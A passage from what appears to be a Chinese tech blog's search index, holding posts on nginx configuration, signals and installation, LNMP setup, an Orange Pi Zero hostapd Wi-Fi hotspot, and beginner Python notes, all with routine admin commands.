title=\"nginx.conf\"></a>nginx.conf</h3><p><code>nginx.conf</code>中的命令分为<strong>简单命令</strong>和<strong>块命令</strong></p>\n<p>简单命令由构成为：<code>command args ... ;</code>，一个命令，多个参数，空格相隔，分号结尾。例如：<code>error_log logs/error.log info</code>中<code>error_log</code>是命令名称，参数1是<code>logs/error.log</code>指明日志位置，参数2<code>info</code>说明日志的级别。</p>\n<p>块命令是一个大括号，里面有多个简单命令。一个块中的其他命令称之为<strong>上下文</strong>。例如：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">location / &#123;</span><br><span class=\"line\">  root html;</span><br><span class=\"line\">  index index.html index.htm;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><img src=\"1.jpg\" alt=\"\"></p>\n<p>上下文可以相互嵌套并重复（如果配置了多个虚拟服务器，那么<code>http</code>中就会出现多个<code>server</code>）</p>\n<p>配置文件中用<code>#</code>作为注释。</p>\n<p>配置文件中使用<code>$</code>引用变量，用<code>set var_name value</code>来自定义变量。例如：<code>set $a &quot;hello world&quot;</code>。变量可以在字符串中被解引用，实现字符串拼接：<code>set $b = &quot;$a,$a&quot;</code>，此时<code>$b</code>就是”hello world,hello world”</p>\n<h2 id=\"启动与关闭\"><a href=\"#启动与关闭\" class=\"headerlink\" title=\"启动与关闭\"></a>启动与关闭</h2><h3 id=\"启动\"><a href=\"#启动\" class=\"headerlink\" title=\"启动\"></a>启动</h3><p>直接启动：<code>sudo nginx</code><br>指定文件启动：<code>sudo nginx -c /usr/local/nginx/conf/nginx.conf</code><br>使用service管理启动：<code>sudo service nginx start</code>  </p>\n<h3 id=\"停止\"><a href=\"#停止\" class=\"headerlink\" title=\"停止\"></a>停止</h3><p>nginx的停止分为3种，从容停止，快速停止和强制停止。用<code>ps -ef | grep nginx</code>可以查看nginx主进程号，接下来操作的进程都是针对主进程，通过不同的信号来关闭nginx：</p>\n<ul>\n<li>快速停止：<code>sudo kill -TERM &lt;pid&gt;</code>或<code>sudo kill -INT &lt;pid&gt;</code></li>\n<li>从容停止：<code>sudo kill -QUIT &lt;pid&gt;</code>，会处理完请求后关闭</li>\n<li>强制停止：<code>sudo kill -KILL &lt;pid&gt;</code></li>\n</ul>\n<p>也可以<code>sudo service nginx stop</code>或<code>sudo nginx -s stop</code></p>\n<h3 id=\"重启\"><a href=\"#重启\" class=\"headerlink\" title=\"重启\"></a>重启</h3><p><code>sudo kill -HUP &lt;pid&gt;</code>或<code>sudo nginx -s reload</code><br>主进程接收到重启信号后，会检测配置文件合法性，失败回滚，成功则创建新的工作进程，并通知旧的工作进程关闭。运行中的工作进程收到关闭的命令会停止接受新的链接，并继续处理当前已接受的请求，直到没有请求后再退出。</p>\n<h3 id=\"更新版本-与-恢复版本\"><a href=\"#更新版本-与-恢复版本\" class=\"headerlink\" title=\"更新版本 与 恢复版本\"></a>更新版本 与 恢复版本</h3><p>当nginx需要添加新的模块时，需要重新编译。</p>\n<ul>\n<li>对于手动安装的nginx，将新版本的nginx编译安装到旧版本的安装路径中，让新版本的可执行文件替换旧版本的可执行文件。</li>\n<li>执行<code>sudo kill -USR2 &lt;pid&gt;</code>，然后nginx会启动新的主进程，并重命名<code>nginx.pid</code>到<code>nginx.pid.oldbin</code>，原有的<code>nginx.pid</code>会被新的主进程占用。此时出现两个主进程同时运行的情况，并且存在两批新旧工作进程，他们会同时工作，共同处理请求。nginx热启动的详细原理可以看：<a href=\"https://blog.csdn.net/yizhou35/article/details/103106225\">nginx平滑启动原理：USR1和USR2型号的区别</a></li>\n<li>此时还需要停止旧的进程，就要发送<code>WINCH</code>信号给旧的主进程：<code>sudo kill -WINCH path/to/nginx.pid.oldbin</code>，他的进程会被从容关闭。当旧进程处理完已有的链接后会自动退出，仅剩新进程处理输入请求。</li>\n<li>当新的版本启动后，新版本有问题，可以恢复为旧版本：</li>\n<li>执行上述操作后，旧版本不会关闭其Listen Socket，并可以管理他，用<code>sudo kill -HUP &lt;old pid&gt;</code>将会不在重载入配置文件的情况下启动旧版的工作进程。</li>\n<li>用<code>sudo kill -QUIT &lt;new pid&gt;</code>杀掉新版本主进程号，如果出现了问题不能退出，则相继使用<code>TERM</code>和<code>KILL</code>信号强制退出。新版本退出后，旧版本主进程文件会被移除<code>.oldbin</code>后缀，回复<code>.pid</code>后缀，一切将恢复到升级前。</li>\n</ul>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>linux的信号机制对nginx的操作主要如下：<br>|  信号   | 说明  |<br>|  ——  | ——  |<br>| TERM/INT  | 快速关闭 |<br>| QUIT  | 优雅的关闭进程,即等请求结束后再关闭 |<br>| HUP | 改变配置文件,平滑的重读配置文件 |<br>| USR1 | 重读日志,在日志按月/日分割时有用 |<br>| USR2 | 平滑的升级 |<br>| WINCH | 优雅关闭旧的进程(配合USR2来进行升级) |</p>\n<h2 id=\"模块化\"><a href=\"#模块化\" class=\"headerlink\" title=\"模块化\"></a>模块化</h2><p>nginx将各个模块组织成一个链条吗，当有请求到达时经过链条上的部分或者全部模块，然后进行处理，每个模块实现特定功能。<br><img src=\"2.jpg\" alt=\"\"></p>\n<p>nginx core实现了底层的通信协议，为其他模块和nginx进程构建基本运行环境，并构建了其他模块的协作基础。http和mail模块位于中间层，实现HTTP和Mail协议(SMTP/IMAP/POP3)。</p>\n<p>nginx模块根据功能可以分为六类：、<br><img src=\"3.jpg\" alt=\"\"></p>\n","tags":["Nginx"]},{"title":"Nginx安装与配置","url":"/2019/05/01/Nginx%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/","content":"<blockquote>\n<p>实验楼nginx课程练习地址：<a href=\"https://www.shiyanlou.com/courses/95\">Nginx实战</a></p>\n</blockquote>\n<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>Nnginx 是一款高性能的 HTTP 和反向代理服务器软件，第一个开源版本诞生于 2004 年,虽然诞生较晚但经过十多年的发展,已经成为非常流行的 web 服务器软件。</p>\n<h2 id=\"为什么选择-Nginx\"><a href=\"#为什么选择-Nginx\" class=\"headerlink\" title=\"为什么选择 Nginx\"></a>为什么选择 Nginx</h2><h3 id=\"Nginx-和-Apache-相同点\"><a href=\"#Nginx-和-Apache-相同点\" class=\"headerlink\" title=\"Nginx 和 Apache 相同点\"></a>Nginx 和 Apache 相同点</h3><ul>\n<li>同是 HTTP 服务器软件，都采用<strong>模块化</strong>结构设计</li>\n<li>支持通用语言接口，如 PHP、Python 等</li>\n<li>支持正向代理和反向代理</li>\n<li>支持虚拟主机及 ssl 加密传输</li>\n<li>支持缓存及压缩传输</li>\n<li>支持 URL 重写</li>\n<li>模块多,扩展性强</li>\n<li>多平台支持</li>\n</ul>\n<span id=\"more\"></span>\n<h3 id=\"优势与劣势\"><a href=\"#优势与劣势\" class=\"headerlink\" title=\"优势与劣势\"></a>优势与劣势</h3><h4 id=\"Nginx的优势\"><a href=\"#Nginx的优势\" class=\"headerlink\" title=\"Nginx的优势\"></a>Nginx的优势</h4><ul>\n<li>轻量级 安装文件小 运行时 CPU 内存使用率低</li>\n<li>性能强 支持多核,处理静态文件效率高,内核采用的 poll 模型最大可以支持 50K 并发连接</li>\n<li>支持热部署 同时启动速度快,可以在不间断服务的情况下对软件和配置进行升级</li>\n<li>负载均衡 支持容错和健康检查</li>\n<li>代理功能强大 支持无缓存的反向代理,同时支持 IMAP/POP3/SMTP 的代理</li>\n</ul>\n<h4 id=\"Nginx的劣势\"><a href=\"#Nginx的劣势\" class=\"headerlink\" title=\"Nginx的劣势\"></a>Nginx的劣势</h4><ul>\n<li>相比 Apache 模块要少一些，常用模块都有了，而且支持 LUA 语言扩展功能<br>对动态请求支持不如 apache</li>\n<li>Windows 版本功能有限，受限于 windows 的特性,支持最好的还是 Unix 系统</li>\n</ul>\n<h2 id=\"Nginx-工作原理\"><a href=\"#Nginx-工作原理\" class=\"headerlink\" title=\"Nginx 工作原理\"></a>Nginx 工作原理</h2><p>Nginx 由内核和一系列模块组成，内核提供 web 服务的基本功能，如启用网络协议，创建运行环境，接收和分配客户端请求，处理模块之间的交互。Nginx 的各种功能和操作都由模块来实现。Nginx 的模块从结构上分为核心模块、基础模块和第三方模块。</p>\n<p>核心模块： HTTP 模块、EVENT 模块和 MAIL 模块</p>\n<p>基础模块： HTTP Access 模块、HTTP FastCGI 模块、HTTP Proxy 模块和 HTTP Rewrite 模块</p>\n<p>第三方模块： HTTP Upstream Request Hash 模块、Notice 模块和 HTTP Access Key 模块及用户自己开发的模块</p>\n<p>这样的设计使 Nginx 方便开发和扩展，也正因此才使得 Nginx 功能如此强大。Nginx 的模块默认编译进 nginx 中，<strong>如果需要增加或删除模块，需要重新编译 Nginx</strong>,这一点不如 Apache 的动态加载模块方便。如果有需要动态加载模块，可以使用由淘宝网发起的 web 服务器 Tengine，在 nginx 的基础上增加了很多高级特性，完全兼容 Nginx，已被国内很多网站采用。</p>\n<h2 id=\"Nginx-的常用架构\"><a href=\"#Nginx-的常用架构\" class=\"headerlink\" title=\"Nginx 的常用架构\"></a>Nginx 的常用架构</h2><p>web 历史上最流行最经典的环境是 LAMP（Linux + Apache + Mysql + PHP）,至今仍有大量网站采用此架构，Apache 默认配置在未优化的情况下比较占用 CPU 和内存。借助于 Nginx 的轻量和高性能，LNMP 架构只是将 LAMP 环境中的 Apache 换成 Nginx，于是另一经典 LNMP 架构就诞生了。LNMP 在服务器硬件配置相同时，相对于 LAMP 会使用更少的 CPU 和内存，是小型网站，低配服务器，和 VPS 的福音。</p>\n<h1 id=\"安装与启动\"><a href=\"#安装与启动\" class=\"headerlink\" title=\"安装与启动\"></a>安装与启动</h1><ul>\n<li>环境：ubuntu 20.04</li>\n</ul>\n<h2 id=\"使用apt安装：\"><a href=\"#使用apt安装：\" class=\"headerlink\" title=\"使用apt安装：\"></a>使用apt安装：</h2><p><code>sudo apt-get install nginx</code><br>启动/关闭/状态查看/重新启动<br><code>sudo /etc/init.d/nginx [start|stop|status|restart]</code><br>也可以用systemctl工具<br><code>sudo systemctl [start|stop|status|restart] nginx</code><br>旧版的service<br><code>sudo service nginx [start|stop|status|reload]</code></p>\n<h2 id=\"手动编译\"><a href=\"#手动编译\" class=\"headerlink\" title=\"手动编译\"></a>手动编译</h2><p>使用包管理器安装固然方便，单后续重新编译模块将会很麻烦，手动编译安装可以避免这一问题，还有助于我们更好理解nginx：<br><code>cd /usr/local</code>，下载源码：<code>sudo wget http://nginx.org/download/nginx-1.18.0.tar.gz</code><br>解压：<code>sudo tar -zxvf nginx-1.18.0.tar.gz</code><br>删除压缩包：<code>sudo rm nginx-1.18.0.tar.gz</code><br><code>sudo mv nginx-1.18.0 nginx &amp;&amp; cd nginx</code>  </p>\n<p>nginx编译需要依赖<code>zlib</code>,<code>pcre</code>,<code>openssl</code>，ubuntu下安装这些包：<code>sudo apt install openssl libssl-dev libpcre3 libpcre3-dev zlib1g-dev</code></p>\n<p>执行配置：<code>sudo ./configure</code>进行编译前的参数设置（可以用<code>./configure --help</code>查看具体配置参数），配置完后显示相关目标路径：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">nginx path prefix: &quot;/usr/local/nginx&quot; #安装目录</span><br><span class=\"line\">nginx binary file: &quot;/usr/local/nginx/sbin/nginx&quot; #二进制文件位置</span><br><span class=\"line\">nginx modules path: &quot;/usr/local/nginx/modules&quot;</span><br><span class=\"line\">nginx configuration prefix: &quot;/usr/local/nginx&quot;</span><br><span class=\"line\">nginx configuration file: &quot;/usr/local/nginx/nginx.conf&quot; 配置文件</span><br><span class=\"line\">nginx pid file: &quot;/usr/local/nginx/logs/nginx.pid&quot;</span><br><span class=\"line\">nginx error log file: &quot;/usr/local/nginx/logs/error.log&quot;</span><br><span class=\"line\">nginx http access log file: &quot;/usr/local/nginx/logs/access.log&quot;</span><br><span class=\"line\">nginx http client request body temporary files: &quot;client_body_temp&quot;</span><br><span class=\"line\">nginx http proxy temporary files: &quot;proxy_temp&quot;</span><br><span class=\"line\">nginx http fastcgi temporary files: &quot;fastcgi_temp&quot;</span><br><span class=\"line\">nginx http uwsgi temporary files: &quot;uwsgi_temp&quot;</span><br><span class=\"line\">nginx http scgi temporary files: &quot;scgi_temp&quot;</span><br></pre></td></tr></table></figure><br>配置完后，目录下会生成Makefile，编译安装：<code>sudo make &amp;&amp; sudo make install</code></p>\n<p>添加<code>/usr/local/nginx/sbin</code>到<code>$PATH</code>，输入<code>nginx -v</code>：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">nginx version: nginx/1.18.0</span><br></pre></td></tr></table></figure><br>打印出版本信息，说明安装成功。</p>\n<p>用<code>nginx -t</code>检测<code>nginx.conf</code>配置文件是否合法，然后<code>sudo nginx</code>启动，可通过浏览器输入<code>http://localhost</code>查看启动情况。</p>\n<h1 id=\"基础配置\"><a href=\"#基础配置\" class=\"headerlink\" title=\"基础配置\"></a>基础配置</h1><p><code>sudo vim /etc/nginx/sites-available/default</code><br>取消php模块的注释：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">location ~ \\.php$ &#123;</span><br><span class=\"line\">        include snippets/fastcgi-php.conf;</span><br><span class=\"line\"></span><br><span class=\"line\">        # With php7.0-cgi alone:</span><br><span class=\"line\">#        fastcgi_pass 127.0.0.1:9000;</span><br><span class=\"line\">        # With php7.0-fpm:</span><br><span class=\"line\">        fastcgi_pass unix:/run/php/php7.0-fpm.sock;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>测试配置：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo nginx -t</span><br></pre></td></tr></table></figure><br>显示如下则表示成功：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">nginx: the configuration file /etc/nginx/nginx.conf syntax is ok</span><br><span class=\"line\">nginx: configuration file /etc/nginx/nginx.conf test is successful</span><br></pre></td></tr></table></figure><br>使配置文件生效：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl restart nginx</span><br></pre></td></tr></table></figure><br>在 LNMP 中的作用或角色：nginx 本身不能处理 PHP，它只是个 web 服务器，当接收到请求后，如果是 php 请求，则发给 php 解释器处理，并把结果返回给客户端.php-fpm 是一个守护进程（FastCGI 进程管理器）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。安装php,并启动:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install -y php7.0-fpm</span><br><span class=\"line\">sudo systemctl start php7.0-fpm</span><br></pre></td></tr></table></figure><br>此时在webRoot（笔者为<code>/var/www/html</code>）下新建一个php测试文件<code>test.php</code>,输入：<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span>(<span class=\"string\">&#x27;&lt;h1&gt;It works!&lt;/h1&gt;&#x27;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure><br>保存，输入域名地址<code>http://your-server-domain/test.php</code>,显示<code>It works</code>说明成功了。</p>\n<p>如果是安装LNMP，还差一个mysql，首先安装mysql，然后还需要php和mysql的连接器，安装完成后还需要重启php-fpm<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get install -y php7.0-mysql</span><br><span class=\"line\">sudo systemctl restart php7.0-fpm</span><br></pre></td></tr></table></figure></p>\n<p>有时候需要改变nginx监听的端口（虽然我觉得不太用得上。。。）<code>sudo vim /etc/nginx/sites-available/default</code>，原配置一般是这样：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">        listen 80 default_server;</span><br><span class=\"line\">        listen [::]:80 default_server;</span><br><span class=\"line\">        .....</span><br></pre></td></tr></table></figure><br>修改两个listen的端口，这里应该是对应的ipv4和ipv6监听的端口<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">        listen 9000 default_server;</span><br><span class=\"line\">        listen [::]:9000 default_server ipv6only=on;</span><br></pre></td></tr></table></figure></p>\n<p>如果哦nginx启动不了，先看<code>sudo systemctl status nginx</code> 中的错误信息，然后查看日志 <code>tail /var/log/nginx/error.log</code></p>\n<h1 id=\"Nginx进程和模块\"><a href=\"#Nginx进程和模块\" class=\"headerlink\" title=\"Nginx进程和模块\"></a>Nginx进程和模块</h1>","tags":["Nginx","运维"]},{"title":"Orange Pi Zero创建无线热点","url":"/2022/05/22/Orange-Pi-Zero%E5%88%9B%E5%BB%BA%E6%97%A0%E7%BA%BF%E7%83%AD%E7%82%B9/","content":"<blockquote>\n<p>想从已有的一个WiFi热点搭建另一个NAT WiFi热点，首先想到的解决方案就是用树莓派hostapd搭建个低功耗的路由器。但是我树莓派丢在了老家当机顶盒，打开淘宝想买个新的被最近飞涨的价格吓到了，于是打算尝试国产山寨开发板Orange Pi</p>\n</blockquote>\n<ul>\n<li>型号：Orange Pi Zero</li>\n</ul>\n<p><img src=\"1.jpg\" alt=\"\"></p>\n<p>用Orange Pi Zero内置WiFi网卡，以及额外的一个USB WiFi网卡来实现创建NAT WiFi子网。</p>\n<span id=\"more\"></span>\n<h2 id=\"安装Armbian\"><a href=\"#安装Armbian\" class=\"headerlink\" title=\"安装Armbian\"></a>安装Armbian</h2><p>和树莓派烧录系统的流程一样，这里从<a href=\"http://www.orangepi.org/downloadresources/\">Orange Pi官方网站</a>上选择要安装的系统镜像下载，然后烧录到SD卡中。有Android，Ubuntu，Debian以及Armbian可选，据说Armbian比较稳定，于是选择<a href=\"https://www.armbian.com/download/?tx_maker=xunlong\">下载Armbian</a>。</p>\n<p>完成后插入SD卡启动。Armbian提供的镜像默认开启了sshd服务，直接接上以太网SSH登录过去，初始用户<code>root</code>、密码<code>1234</code>。初次登录会有脚本引导修改密码、创建用户、设置shell和时区。</p>\n<p>国内Armbian可以使用USTC的debian源：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">deb http://mirrors.ustc.edu.cn/debian buster main contrib non-free</span><br><span class=\"line\">deb http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free</span><br><span class=\"line\">deb http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free</span><br><span class=\"line\">deb http://mirrors.ustc.edu.cn/debian-security/ buster/updates main contrib non-free</span><br></pre></td></tr></table></figure></p>\n<p><code>ip link</code>可以看到现在有四个网卡：</p>\n<ul>\n<li><code>lo</code>：本地loopback</li>\n<li><code>eth0</code>：以太网</li>\n<li><code>wlan0</code>：内置WiFi网卡</li>\n<li><code>wlx38a28c92017a</code>：USB WiFi网卡<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000</span><br><span class=\"line\">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">2: eth0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc mq state DOWN mode DEFAULT group default qlen 1000</span><br><span class=\"line\">    link/ether 02:81:14:8c:e3:dc brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">3: wlan0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP mode DORMANT group default qlen 1000</span><br><span class=\"line\">    link/ether 3e:bb:30:9a:52:52 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">4: wlx38a28c92017a: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP mode DORMANT group default qlen 1000</span><br><span class=\"line\">    link/ether 38:a2:8c:92:01:7a brd ff:ff:ff:ff:ff:ff</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>使用<code>armbian-config</code>可以进行系统配置（常用第三方包，配置host，配置网络）</p>\n<h2 id=\"开启AP\"><a href=\"#开启AP\" class=\"headerlink\" title=\"开启AP\"></a>开启AP</h2><ol>\n<li>安装<code>hostapd</code>和<code>isc-dhcp-server</code>：<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt install hostapd isc-dhcp-server</span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> isc-dhcp-server</span><br><span class=\"line\">systemctl stop isc-dhcp-server</span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> hostapd</span><br><span class=\"line\">systemctl stop hostapd</span><br></pre></td></tr></table></figure>\n<code>hostapd</code>用于创建热点，<code>isc-dhcp-server</code>用于提供DHCP服务。</li>\n</ol>\n<p>编辑<code>/etc/hostapd.conf</code>：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#</span><br><span class=\"line\"># armbian hostapd configuration example</span><br><span class=\"line\">#</span><br><span class=\"line\"># nl80211 mode</span><br><span class=\"line\">#</span><br><span class=\"line\"></span><br><span class=\"line\">ssid=Orange</span><br><span class=\"line\">interface=wlan0</span><br><span class=\"line\">hw_mode=g</span><br><span class=\"line\">channel=5</span><br><span class=\"line\">#bridge=br0</span><br><span class=\"line\">driver=nl80211</span><br><span class=\"line\"></span><br><span class=\"line\">logger_syslog=0</span><br><span class=\"line\">logger_syslog_level=0</span><br><span class=\"line\">wmm_enabled=1</span><br><span class=\"line\">wpa=2</span><br><span class=\"line\">preamble=1</span><br><span class=\"line\"></span><br><span class=\"line\">wpa_passphrase=123456</span><br><span class=\"line\">wpa_key_mgmt=WPA-PSK</span><br><span class=\"line\">wpa_pairwise=TKIP</span><br><span class=\"line\">rsn_pairwise=CCMP</span><br><span class=\"line\">auth_algs=1</span><br><span class=\"line\">macaddr_acl=0</span><br><span class=\"line\"></span><br><span class=\"line\"># controlling enabled</span><br><span class=\"line\">ctrl_interface=/var/run/hostapd</span><br><span class=\"line\">ctrl_interface_group=0</span><br></pre></td></tr></table></figure><br>注释掉<code>bridge=br0</code>，修改<code>ssid</code>和<code>wpa_passphrase</code>为SSID和密码。</p>\n<p>编辑<code>/etc/default/hostapd</code>，将<code>DAEMON_CONF=&quot;&quot;</code>取消注释，改为：<code>DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot;</code></p>\n<p>修改<code>/etc/dhcp/dhcpd.conf</code>，末尾加上：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">subnet 192.168.100.0 netmask 255.255.255.0 &#123;</span><br><span class=\"line\">        range 192.168.100.2 192.168.100.254; # DHCP range</span><br><span class=\"line\">        option domain-name-servers 223.5.5.5, 223.6.6.6; # Primary/Secondary DNS</span><br><span class=\"line\">        option routers 192.168.100.1; # Router Addr</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>配置子网<code>192.168.100.0/24</code>，DHCP范围<code>192.168/100.2 ～ 192.168/100.254</code>，配置主/备DNS为阿里DNS，配置路由<code>192.168.100.1</code></p>\n<ol>\n<li><p>关闭<code>wlan0</code>网卡。Orange Pi内置的网卡默认是<code>wlan0</code>，网卡不能同时用作WiFi接入网卡和AP网卡，在开启AP前需要先关闭wlan0，Armbian提供了网络管理工具<code>nmcli</code>，关闭网卡：<code>nmcli dev disconnect wlan0</code>。</p>\n</li>\n<li><p>启动DHCP服务<code>isc-dhcp-server</code>前需要将wlan0的IP绑定先前的路由地址<code>192.168.100.1</code>：<code>ifconfig wlan0 192.168.100.1 netmask 255.255.255.0</code>，然后启动DHCP：<code>systemctl start isc-dhcp-server</code></p>\n</li>\n<li><p>启动hostapd：<code>systemctl start hostapd</code>。此时已经可以连上名称为<code>Orange</code>的热点了，只是要上网还需要开启IP转发。</p>\n</li>\n<li><p>开启IP转发：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward </span><br><span class=\"line\">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class=\"line\">iptables -t nat -A POSTROUTING -o wlx38a28c92017a -j MASQUERADE</span><br></pre></td></tr></table></figure>\n<p>其中<code>eth0</code>是以太网卡，<code>wlx38a28c92017a</code>改成外置的USB网卡名。Orange Pi此时可以通过以太网接入互联网，也可以通过额外的USB WiFi网卡接入。用<code>nmtui</code>命令可以在TUI中配置WiFi连接。</p>\n</li>\n<li><p>开机启动：</p>\n</li>\n</ol>\n<p>创建脚本<code>/root/ap.sh</code>：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmcli dev disconnect wlan0</span><br><span class=\"line\"></span><br><span class=\"line\">ifconfig wlan0 192.168.100.1 netmask 255.255.255.0</span><br><span class=\"line\"></span><br><span class=\"line\">rm -rf /var/run/dhcpd.pid     </span><br><span class=\"line\">systemctl start isc-dhcp-server</span><br><span class=\"line\"></span><br><span class=\"line\">systemctl start hostapd</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward </span><br><span class=\"line\">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class=\"line\">iptables -t nat -A POSTROUTING -o wlx38a28c92017a -j MASQUERADE</span><br></pre></td></tr></table></figure><br>在<code>/etc/rc.local</code>中添加启动执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># enable AP</span></span><br><span class=\"line\">sh /root/ap.sh</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"使用体验\"><a href=\"#使用体验\" class=\"headerlink\" title=\"使用体验\"></a>使用体验</h2><p>实际使用略有延迟，速度达到直连的80%。使用一小时候感觉到Orange Pi的发热明显比树莓派高出不少，建议配合风扇和散热片使用。<br><img src=\"2.jpg\" alt=\"\"></p>\n","tags":["OrangePi"]},{"title":"Python学习笔记（一）","url":"/2018/11/02/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/","content":"<p>学习过程：Python入门 -&gt; pandas -&gt;scikit-learn</p>\n<p>主要任务：学习SciPy</p>\n<p><a href=\"https://jingyan.baidu.com/article/4b07be3c64483b48b280f35e.html\">data.Frame学习网址</a></p>\n<p><a href=\"http://www.runoob.com/python3/python3-tutorial.html\">python3学习网址</a></p>\n<h2 id=\"Python入门-Python3\"><a href=\"#Python入门-Python3\" class=\"headerlink\" title=\"Python入门(Python3)\"></a>Python入门(Python3)</h2><h2 id=\"基本输入输出\"><a href=\"#基本输入输出\" class=\"headerlink\" title=\"基本输入输出\"></a>基本输入输出</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">a = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;input number&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;number is&quot;</span>,a)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"number\">123</span>,<span class=\"number\">456</span>,sep=<span class=\"string\">&quot;#&quot;</span>,end=<span class=\"string\">&quot;=&quot;</span>) <span class=\"comment\">#设置分隔符和结尾符</span></span><br><span class=\"line\"><span class=\"comment\">#输出： 123#456=</span></span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h2 id=\"GC机制\"><a href=\"#GC机制\" class=\"headerlink\" title=\"GC机制\"></a>GC机制</h2><p>维护对象的引用计数表，如果计数为0就回收资源</p>\n<h2 id=\"命名规则\"><a href=\"#命名规则\" class=\"headerlink\" title=\"命名规则\"></a>命名规则</h2><p>一般以下划线开头的变量都是系统变量，下划线开头的变量不能被import导入，以两个下划线开头的变量是类的本地变量</p>\n<h2 id=\"赋值语句\"><a href=\"#赋值语句\" class=\"headerlink\" title=\"赋值语句\"></a>赋值语句</h2><p>Python支持多种赋值方式，简单赋值，序列赋值，多目标赋值，增强赋值<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">a = <span class=\"number\">10</span></span><br><span class=\"line\">(x,y) = (<span class=\"number\">10</span>,<span class=\"number\">20</span>)</span><br><span class=\"line\">[x,y] = [<span class=\"number\">30</span>,<span class=\"string\">&#x27;abc&#x27;</span>]</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"基本容器\"><a href=\"#基本容器\" class=\"headerlink\" title=\"基本容器\"></a>基本容器</h2><ul>\n<li>集合：无需元素不可变</li>\n<li>数字：整数，浮点数，复数，分数</li>\n<li>序列：字符串，列表，元组都属于有序序列，支持索引分片和合并等操作</li>\n<li>映射：字典，将键映射到值</li>\n</ul>\n<h3 id=\"列表\"><a href=\"#列表\" class=\"headerlink\" title=\"列表\"></a>列表</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">a = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"string\">&#x27;abc&#x27;</span>]</span><br><span class=\"line\">b = <span class=\"built_in\">list</span>(<span class=\"string\">&#x27;python&#x27;</span>) <span class=\"comment\"># b = [&#x27;p&#x27;,&#x27;y&#x27;,&#x27;t&#x27;,&#x27;h&#x27;,&#x27;o&#x27;,&#x27;n&#x27;]</span></span><br></pre></td></tr></table></figure>\n<p>列表是广义容器，可以支持下表访问，变长，可以修改成员。类似一个存储广义类型引用的变长数组。</p>\n<p>删除元素：<code>del 